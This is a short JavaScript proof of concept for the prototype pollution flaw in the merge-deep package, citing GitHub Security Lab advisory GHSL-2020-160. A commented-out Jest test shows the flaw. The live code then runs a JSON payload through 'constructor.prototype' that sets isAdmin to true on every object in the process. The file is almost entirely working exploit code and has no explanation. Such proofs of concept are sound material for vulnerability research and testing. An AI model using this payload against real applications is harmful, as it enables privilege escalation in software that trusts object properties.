//https://securitylab.github.com/advisories/GHSL-2020-160-merge-deep/
// test("prototype pollution in merge-deep", () => {
//   expect({}.polluted).toBe(undefined);

//   const mergeDeep = require("merge-deep");
//   let payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';
//   mergeDeep({}, JSON.parse(payload));
//   expect({}.polluted).toBe("yes");
// });

var mergeDeep = require("merge-deep");
var payload = '{"constructor": {"prototype": {"isAdmin": true}}}';
mergeDeep({}, JSON.parse(payload));
